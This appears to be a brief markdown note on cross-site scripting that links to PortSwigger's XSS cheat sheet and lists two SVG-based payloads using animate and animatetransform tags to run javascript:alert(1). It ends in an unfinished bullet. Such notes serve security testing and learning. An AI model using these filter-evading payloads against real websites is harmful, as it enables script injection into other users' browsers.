## Something to keep in mind.

For complete list refer the burpsuite cheatsheet:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Unique Payloads:

- `<svg>`

  - `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`
  - `<svg><animatetransform onbegin=alert(1)>`

- change
